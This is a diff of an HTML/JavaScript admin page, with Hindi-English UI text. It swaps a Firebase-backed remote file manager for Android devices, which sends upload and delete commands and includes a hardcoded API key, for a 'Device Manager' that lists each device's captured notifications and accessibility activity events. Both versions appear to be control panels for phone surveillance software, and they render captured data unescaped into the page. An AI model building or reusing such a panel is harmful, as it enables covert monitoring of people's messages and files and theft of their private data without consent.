@@ -3,293 +3,254 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Firebase Admin Panel + Gemini AI</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
+    <title>Activity Detail Admin Panel</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    
     <style>
-        .no-scrollbar::-webkit-scrollbar { display: none; }
-        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
-        .modal-active { display: flex !important; }
-        @keyframes slideUp {
-            from { transform: translateY(100%); }
-            to { transform: translateY(0); }
+        :root {
+            --bg: #000000;
+            --drawer-bg: #111111;
+            --card-bg: #121212;
+            --accent: #007bff;
+            --text: #ffffff;
+            --dim: #888888;
+            --border: #222222;
+            --danger: #ff4d4d;
         }
-        .animate-slide-up { animation: slideUp 0.3s ease-out; }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: var(--bg); color: var(--text); height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+
+        /* Navigation */
+        nav { height: 60px; background: #000; border-bottom: 1px solid var(--border); display: flex; align-items: center; padding: 0 20px; z-index: 100; }
+        .menu-btn { background: none; border: none; color: white; font-size: 24px; cursor: pointer; margin-right: 20px; }
+
+        /* Drawer */
+        #drawer-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; z-index: 200; }
+        #drawer { position: fixed; top: 0; left: -300px; width: 300px; height: 100%; background: var(--drawer-bg); z-index: 201; transition: 0.3s ease; box-shadow: 5px 0 15px rgba(0,0,0,0.5); display: flex; flex-direction: column; }
+        #drawer.open { left: 0; }
+        .drawer-header { padding: 25px; border-bottom: 1px solid var(--border); font-weight: 700; color: var(--accent); display: flex; justify-content: space-between; align-items: center; }
+        #user-list { flex: 1; overflow-y: auto; padding: 10px; }
+        .user-item { padding: 15px; border-radius: 8px; margin-bottom: 5px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
+        .user-item:hover { background: rgba(255,255,255,0.05); }
+        .user-item.active { background: rgba(0, 168, 255, 0.1); border-color: var(--accent); }
+
+        /* Tabs */
+        .tabs { display: flex; background: #080808; border-bottom: 1px solid var(--border); }
+        .tab-btn { flex: 1; padding: 15px; background: none; border: none; color: var(--dim); cursor: pointer; font-weight: 600; border-bottom: 2px solid transparent; }
+        .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+        /* Action Bar */
+        .action-bar { padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); background: #000; }
+
+        /* Content Scroll Area */
+        .content-area { flex: 1; overflow-y: auto; padding: 20px; }
+        .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px; padding: 15px; margin-bottom: 15px; }
+        .card-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
+        
+        .badge { font-size: 0.65rem; font-weight: 800; padding: 4px 10px; border-radius: 4px; text-transform: uppercase; cursor: default; }
+        .badge-pkg { background: rgba(0, 255, 136, 0.15); color: #00ff88; }
+        
+        /* Blue Badge with Click effect */
+        .badge-act { 
+            background: rgba(0, 168, 255, 0.15); 
+            color: var(--accent); 
+            cursor: pointer; 
+            transition: 0.2s;
+            max-width: 180px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .badge-act:hover { background: var(--accent); color: white; }
+        
+        .time-txt { font-size: 0.7rem; color: var(--dim); }
+        .title-txt { font-size: 1rem; font-weight: 700; color: #fff; margin-bottom: 5px; }
+        .info-txt { font-size: 0.85rem; color: #ccc; line-height: 1.4; margin-bottom: 10px; }
+        .del-btn { background: none; border: 1px solid #333; color: var(--danger); padding: 5px 12px; border-radius: 6px; font-size: 0.75rem; cursor: pointer; }
+
+        /* Modal for Full View */
+        #modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 300; padding: 20px; }
+        #modal-content { background: #1a1a1a; width: 100%; max-width: 500px; border-radius: 15px; border: 1px solid var(--border); animation: zoomIn 0.2s ease; }
+        @keyframes zoomIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .modal-header { padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; color: var(--accent); font-weight: 700; }
+        .modal-body { padding: 20px; color: #fff; font-size: 1rem; line-height: 1.6; word-wrap: break-word; max-height: 60vh; overflow-y: auto; }
+        .close-modal { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; }
+
+        .empty-msg { text-align: center; margin-top: 50px; color: var(--dim); }
+        .clear-btn { background: var(--danger); color: #fff; border: none; padding: 6px 12px; border-radius: 5px; font-size: 0.75rem; cursor: pointer; }
     </style>
 </head>
-<body class="bg-slate-50 text-slate-900 font-sans">
+<body>
+
+    <!-- Drawer Overlay -->
+    <div id="drawer-overlay" onclick="toggleDrawer()"></div>
+
+    <!-- Sidebar Drawer -->
+    <div id="drawer">
+        <div class="drawer-header">
+            <span>DEVICE MANAGER</span>
+            <button class="menu-btn" onclick="toggleDrawer()" style="margin:0;">×</button>
+        </div>
+        <div id="user-list"></div>
+    </div>
+
+    <!-- Modal for Full Text View -->
+    <div id="modal-overlay" onclick="closeModal()">
+        <div id="modal-content" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <span id="modal-title">Activity Detail</span>
+                <button class="close-modal" onclick="closeModal()">×</button>
+            </div>
+            <div class="modal-body" id="modal-body"></div>
+        </div>
+    </div>
 
     <!-- Navbar -->
-    <header class="bg-white border-b px-4 py-4 flex justify-between items-center sticky top-0 z-30 shadow-sm">
-        <div class="flex items-center gap-3">
-            <div class="bg-indigo-600 p-2 rounded-xl">
-                <i data-lucide="zap" class="text-white w-5 h-5"></i>
-            </div>
-            <div>
-                <h1 class="font-bold text-slate-800 tracking-tight">Admin AI Console</h1>
-                <p class="text-[10px] text-indigo-500 font-bold uppercase tracking-widest">Firebase + Gemini</p>
-            </div>
-        </div>
-        <div id="status-indicator" class="flex items-center gap-2 px-3 py-1.5 rounded-full border bg-red-50 border-red-200 text-red-700">
-            <i data-lucide="wifi-off" id="status-icon" class="w-3.5 h-3.5"></i>
-            <span id="status-text" class="text-[11px] font-black">OFFLINE</span>
-        </div>
-    </header>
+    <nav>
+        <button class="menu-btn" onclick="toggleDrawer()">☰</button>
+        <div id="nav-title" style="font-weight: 600;">Select Device</div>
+    </nav>
 
-    <!-- Path & AI Search -->
-    <div class="bg-white border-b px-4 py-2 flex items-center justify-between overflow-x-auto no-scrollbar whitespace-nowrap">
-        <div class="flex items-center gap-2">
-            <button onclick="navigateTo('/storage/emulated/0')" class="text-xs font-bold text-indigo-600">Home</button>
-            <i data-lucide="chevron-right" class="w-3 h-3 text-slate-300"></i>
-            <span id="current-path-display" class="text-xs font-medium text-slate-500">/storage/emulated/0</span>
-        </div>
-        <button onclick="toggleAISidebar()" class="ml-4 p-1.5 bg-indigo-50 rounded-lg border border-indigo-100 text-indigo-600">
-            <i data-lucide="sparkles" class="w-4 h-4"></i>
-        </button>
+    <div class="tabs">
+        <button id="tab-not" class="tab-btn active" onclick="switchTab('Users')">NOTIFICATIONS</button>
+        <button id="tab-act" class="tab-btn" onclick="switchTab('UserActivities')">ACTIVITIES</button>
     </div>
 
-    <!-- Main List -->
-    <main id="file-list" class="flex-1 pb-24 min-h-[70vh]">
-        <div id="loading-state" class="flex flex-col items-center justify-center h-64 gap-3 text-slate-400">
-            <div class="w-8 h-8 border-4 border-indigo-600 border-t-transparent rounded-full animate-spin"></div>
-            <p class="text-sm">Device data sync ho raha hai...</p>
-        </div>
-        <div id="items-container" class="divide-y divide-slate-100"></div>
+    <div class="action-bar" id="action-bar" style="display: none;">
+        <span id="item-count" style="font-size: 0.75rem; color: var(--dim);"></span>
+        <button class="clear-btn" onclick="clearAll()">Clear Tab</button>
+    </div>
+
+    <main id="content-container" class="content-area">
+        <div class="empty-msg">Menu se device select karein.</div>
     </main>
 
-    <!-- Action Modal (Clicking on a file) -->
-    <div id="action-modal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm hidden items-end sm:items-center justify-center p-4 z-50">
-        <div class="bg-white w-full max-w-sm rounded-t-[2rem] sm:rounded-3xl p-6 shadow-2xl animate-slide-up">
-            <div class="flex items-center gap-4 mb-6">
-                <div id="modal-icon-container" class="p-4 bg-slate-100 rounded-2xl">
-                    <i data-lucide="file-text" id="modal-icon" class="w-6 h-6 text-slate-400"></i>
-                </div>
-                <div class="min-w-0 flex-1">
-                    <h3 id="modal-filename" class="font-black text-slate-900 truncate">File Name</h3>
-                    <p id="modal-filepath" class="text-[10px] text-slate-400 font-mono mt-1 truncate">/path</p>
-                </div>
-            </div>
-            
-            <div id="ai-insight-box" class="hidden mb-6 p-3 bg-indigo-50 border border-indigo-100 rounded-xl">
-                <p id="ai-insight-text" class="text-xs text-indigo-900 leading-relaxed"></p>
-            </div>
-
-            <div class="grid gap-3">
-                <div class="grid grid-cols-2 gap-3">
-                    <button onclick="requestUpload()" class="flex flex-col items-center gap-2 p-4 bg-indigo-600 text-white rounded-2xl font-bold active:scale-95 transition-all">
-                        <i data-lucide="upload-cloud" class="w-5 h-5"></i>
-                        <span class="text-xs">Upload Request</span>
-                    </button>
-                    <button onclick="analyzeFile()" class="flex flex-col items-center gap-2 p-4 bg-white border border-indigo-200 text-indigo-600 rounded-2xl font-bold active:scale-95 transition-all">
-                        <i data-lucide="sparkles" class="w-5 h-5"></i>
-                        <span class="text-xs">AI Analyze</span>
-                    </button>
-                </div>
-                <button onclick="requestDelete()" class="flex items-center justify-center gap-3 w-full p-4 bg-rose-50 text-rose-600 rounded-2xl font-bold active:scale-95 transition-all">
-                    <i data-lucide="trash-2" class="w-5 h-5"></i>
-                    <span>Delete from Device</span>
-                </button>
-                <button onclick="closeModal()" class="w-full mt-2 p-4 text-slate-400 font-bold text-sm">Cancel</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Gemini AI Assistant Sidebar -->
-    <div id="ai-sidebar" class="fixed inset-y-0 right-0 w-full max-w-md bg-white shadow-2xl z-[100] transform translate-x-full transition-transform duration-300 flex flex-col">
-        <div class="p-4 bg-indigo-600 text-white flex justify-between items-center">
-            <h2 class="font-bold flex items-center gap-2"><i data-lucide="sparkles" class="w-5 h-5"></i> Gemini Assistant</h2>
-            <button onclick="toggleAISidebar()"><i data-lucide="x" class="w-6 h-6"></i></button>
-        </div>
-        <div id="ai-chat" class="flex-1 overflow-y-auto p-4 space-y-4">
-            <div class="bg-slate-100 p-3 rounded-2xl rounded-tl-none text-sm">Namaste! Main aapki files analyze karne mein madad kar sakta hoon. Poochiye: "Photos kitni hain?" ya "Summary nikaalo". ✨</div>
-        </div>
-        <div class="p-4 border-t">
-            <div class="relative">
-                <input id="ai-prompt" type="text" placeholder="AI se kuch poocho..." class="w-full p-3 pr-12 rounded-xl border border-slate-200 text-sm focus:ring-2 focus:ring-indigo-500 outline-none">
-                <button onclick="askAI()" class="absolute right-2 top-1/2 -translate-y-1/2 bg-indigo-600 text-white p-2 rounded-lg">
-                    <i data-lucide="send" class="w-4 h-4"></i>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, collection, onSnapshot, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-
+    <script>
+        // --- YOUR FIREBASE CONFIG ---
         const firebaseConfig = {
-            apiKey: "AIzaSyAWZlA-6FZy_MvRCbcSbcAwv151UMiKJMk",
-            authDomain: "file-manager-8ca06.firebaseapp.com",
-            databaseURL: "https://file-manager-8ca06-default-rtdb.firebaseio.com",
-            projectId: "file-manager-8ca06",
-            storageBucket: "file-manager-8ca06.firebasestorage.app",
-            messagingSenderId: "542438703900",
-            appId: "1:542438703900:web:22e1c2e3b070fc96de30d9"
+            apiKey: "YOUR_API_KEY",
+            databaseURL: "https://notification-reader-acacb-default-rtdb.firebaseio.com/",
+            projectId: "notification-reader-acacb",
+            appId: "YOUR_APP_ID"
         };
 
-        const apiKey = ""; // Gemini API Key
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let selectedId = null;
+        let currentTab = 'Users';
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const auth = getAuth(app);
-        const appId = "file-manager-8ca06";
-
-        let allFiles = [];
-        let currentPath = "/storage/emulated/0";
-        let selectedFile = null;
-
-        // Gemini AI Call Function
-        async function callGemini(prompt) {
-            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`;
-            const context = `User files list: ${JSON.stringify(allFiles.map(f => ({name: f.name, type: f.type, size: f.size})))}\n\nUser Question: ${prompt}`;
-            
-            try {
-                const res = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ contents: [{ parts: [{ text: context }] }] })
-                });
-                const data = await res.json();
-                return data.candidates[0].content.parts[0].text;
-            } catch (e) {
-                return "Maaf kijiye, abhi response generate nahi ho paa raha hai.";
-            }
+        function toggleDrawer() {
+            const drw = document.getElementById('drawer');
+            const ovr = document.getElementById('drawer-overlay');
+            drw.classList.toggle('open');
+            ovr.style.display = drw.classList.contains('open') ? 'block' : 'none';
         }
 
-        // Firebase Logic
-        signInAnonymously(auth).catch(console.error);
-        onAuthStateChanged(auth, (user) => {
-            if (user) { 
-                updateStatus(true);
-                listenFiles();
-            } else {
-                updateStatus(false);
+        function openModal(text, title = "Full View") {
+            document.getElementById('modal-title').innerText = title;
+            document.getElementById('modal-body').innerText = text;
+            document.getElementById('modal-overlay').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('modal-overlay').style.display = 'none';
+        }
+
+        // Fetch Devices
+        db.ref('Users').on('value', snap => {
+            const list = document.getElementById('user-list');
+            list.innerHTML = '';
+            const data = snap.val();
+            if (data) {
+                Object.keys(data).forEach(id => {
+                    const div = document.createElement('div');
+                    div.className = `user-item ${id === selectedId ? 'active' : ''}`;
+                    div.innerHTML = `<div style="font-size: 0.8rem; font-family: monospace;">${id}</div>`;
+                    div.onclick = () => selectUser(id);
+                    list.appendChild(div);
+                });
             }
         });
 
-        function updateStatus(online) {
-            const indicator = document.getElementById('status-indicator');
-            const text = document.getElementById('status-text');
-            const icon = document.getElementById('status-icon');
-            if(online) {
-                indicator.className = "flex items-center gap-2 px-3 py-1.5 rounded-full border bg-emerald-50 border-emerald-200 text-emerald-700";
-                text.innerText = "ONLINE";
-                icon.setAttribute('data-lucide', 'wifi');
-            } else {
-                indicator.className = "flex items-center gap-2 px-3 py-1.5 rounded-full border bg-red-50 border-red-200 text-red-700";
-                text.innerText = "OFFLINE";
-                icon.setAttribute('data-lucide', 'wifi-off');
-            }
-            lucide.createIcons();
+        function selectUser(id) {
+            selectedId = id;
+            document.getElementById('nav-title').innerText = "ID: " + id;
+            document.getElementById('action-bar').style.display = "flex";
+            toggleDrawer();
+            refreshData();
         }
 
-        function listenFiles() {
-            const ref = collection(db, 'artifacts', appId, 'public', 'data', 'storage_map');
-            onSnapshot(ref, (snap) => {
-                allFiles = snap.docs.map(doc => ({id: doc.id, ...doc.data()}));
-                renderFiles();
-                document.getElementById('loading-state').style.display = 'none';
-            });
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            if(tab === 'Users') document.getElementById('tab-not').classList.add('active');
+            else document.getElementById('tab-act').classList.add('active');
+            if(selectedId) refreshData();
         }
 
-        window.renderFiles = () => {
-            const container = document.getElementById('items-container');
-            const pathDisplay = document.getElementById('current-path-display');
-            container.innerHTML = '';
-            pathDisplay.innerText = currentPath;
-
-            const filtered = allFiles.filter(f => f.parentPath === currentPath);
-            if(filtered.length === 0) {
-                container.innerHTML = '<div class="p-10 text-center text-slate-400">Empty Folder ya data sync nahi hua.</div>';
-            }
-
-            filtered.forEach(file => {
-                const item = document.createElement('div');
-                item.className = "flex items-center justify-between p-4 bg-white hover:bg-slate-50 border-b cursor-pointer";
-                let icon = 'file-text';
-                if(file.type === 'folder') icon = 'folder';
-                if(file.type === 'image') icon = 'image';
-
-                item.innerHTML = `
-                    <div class="flex items-center gap-4 flex-1">
-                        <i data-lucide="${icon}" class="${file.type === 'folder' ? 'text-amber-500 fill-amber-500' : 'text-slate-400'} w-6 h-6"></i>
-                        <div class="truncate">
-                            <p class="text-sm font-bold text-slate-700 truncate">${file.name}</p>
-                            <p class="text-[10px] text-slate-400 uppercase tracking-tighter">${file.size || (file.type === 'folder' ? 'Folder' : '--')}</p>
-                        </div>
-                    </div>
-                `;
-                item.onclick = () => {
-                    if(file.type === 'folder') {
-                        currentPath = file.path;
-                        renderFiles();
-                    } else {
-                        openModal(file);
-                    }
-                };
-                container.appendChild(item);
-            });
-            lucide.createIcons();
-        };
-
-        window.openModal = (file) => {
-            selectedFile = file;
-            document.getElementById('modal-filename').innerText = file.name;
-            document.getElementById('modal-filepath').innerText = file.path;
-            document.getElementById('action-modal').classList.add('modal-active');
-            document.getElementById('ai-insight-box').classList.add('hidden');
-        };
-
-        window.closeModal = () => {
-            document.getElementById('action-modal').classList.remove('modal-active');
-        };
-
-        window.analyzeFile = async () => {
-            const box = document.getElementById('ai-insight-box');
-            const text = document.getElementById('ai-insight-text');
-            box.classList.remove('hidden');
-            text.innerText = "Analyzing file details...";
-            const response = await callGemini(`Tell me about this file: ${selectedFile.name} of type ${selectedFile.type}. What could it be? Respond in 1 short Hindi sentence.`);
-            text.innerText = response;
-        };
-
-        window.requestUpload = async () => {
-            const ref = collection(db, 'artifacts', appId, 'public', 'data', 'requests');
-            await addDoc(ref, { command: 'UPLOAD', path: selectedFile.path, name: selectedFile.name, timestamp: serverTimestamp() });
-            closeModal();
-        };
-
-        window.requestDelete = async () => {
-            const ref = collection(db, 'artifacts', appId, 'public', 'data', 'requests');
-            await addDoc(ref, { command: 'DELETE', path: selectedFile.path, name: selectedFile.name, timestamp: serverTimestamp() });
-            closeModal();
-        };
-
-        window.toggleAISidebar = () => {
-            document.getElementById('ai-sidebar').classList.toggle('translate-x-full');
-        };
-
-        window.askAI = async () => {
-            const input = document.getElementById('ai-prompt');
-            const chat = document.getElementById('ai-chat');
-            if(!input.value) return;
-
-            const userMsg = input.value;
-            chat.innerHTML += `<div class="bg-indigo-600 text-white p-3 rounded-2xl rounded-tr-none text-sm ml-auto max-w-[80%]">${userMsg}</div>`;
-            input.value = '';
+        function refreshData() {
+            const container = document.getElementById('content-container');
+            const path = `${currentTab}/${selectedId}`;
             
-            const response = await callGemini(userMsg);
-            chat.innerHTML += `<div class="bg-slate-100 p-3 rounded-2xl rounded-tl-none text-sm max-w-[80%]">${response}</div>`;
-            chat.scrollTop = chat.scrollHeight;
-        };
+            db.ref(path).off();
+            db.ref(path).on('value', snap => {
+                container.innerHTML = '';
+                const items = snap.val();
+                if(!items) {
+                    container.innerHTML = `<div class="empty-msg">No entries found.</div>`;
+                    return;
+                }
 
-        window.navigateTo = (path) => {
-            currentPath = path;
-            renderFiles();
-        };
+                const keys = Object.keys(items);
+                document.getElementById('item-count').innerText = keys.length + " items";
 
-        lucide.createIcons();
+                keys.reverse().forEach(key => {
+                    const val = items[key];
+                    const card = document.createElement('div');
+                    card.className = 'card';
+                    
+                    if (currentTab === 'Users') {
+                        // Notifications: Badge=Package, Title=FB Title
+                        const pkg = val.app || val.package || 'System';
+                        card.innerHTML = `
+                            <div class="card-header">
+                                <span class="badge badge-pkg" onclick="openModal('${pkg}', 'Package Name')">${pkg}</span>
+                                <span class="time-txt">${val.time || ''}</span>
+                            </div>
+                            <div class="title-txt">${val.title || 'No Title'}</div>
+                            <div class="info-txt">${val.message || val.info || ''}</div>
+                            <button class="del-btn" onclick="deleteSingle('${key}')">Delete</button>
+                        `;
+                    } else {
+                        // Activities: Badge=Activity Type (Clickable)
+                        const actText = val.activity || 'TYPE_WINDOW_STATE_CHANGED';
+                        card.innerHTML = `
+                            <div class="card-header">
+                                <span class="badge badge-act" onclick="openModal('${actText}', 'Activity Detail')">${actText}</span>
+                                <span class="time-txt">${val.time || ''}</span>
+                            </div>
+                            <div class="info-txt" style="font-weight:600; color:#fff; font-size:0.95rem;">
+                                ${val.info || val.message || 'Tracked Activity'}
+                            </div>
+                            <button class="del-btn" onclick="deleteSingle('${key}')">Delete</button>
+                        `;
+                    }
+                    container.appendChild(card);
+                });
+            });
+        }
+
+        function deleteSingle(key) {
+            if(confirm("Delete karna hai?")) db.ref(`${currentTab}/${selectedId}/${key}`).remove();
+        }
+
+        function clearAll() {
+            if(confirm("Saara data clear karna hai?")) db.ref(`${currentTab}/${selectedId}`).remove();
+        }
     </script>
 </body>
 </html>
